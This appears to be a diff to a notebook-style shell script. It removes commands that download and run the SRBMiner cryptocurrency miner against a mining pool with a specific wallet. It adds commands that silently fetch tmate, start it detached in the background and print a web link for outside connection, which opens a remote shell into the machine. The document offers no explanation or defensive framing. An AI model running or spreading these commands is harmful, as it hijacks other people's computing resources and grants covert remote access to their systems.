@@ -1,4 +1,6 @@
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.2/SRBMiner-Multi-0-9-2-Linux.tar.xz 
-tar -xf SRBMiner-Multi-0-9-2-Linux.tar.xz
-cd SRBMiner-Multi-0-9-2/
-./SRBMiner-MULTI  --algorithm verushash --pool eu.luckpool.net:3956 >&- --wallet RWuAyz97XdGmE55ymuyy21cEmrEHTSLYnH.1root --password hybrid --cpu-threads 90
+!pkill -9 tmate
+!wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
+!tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
+!rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
+!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
+!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
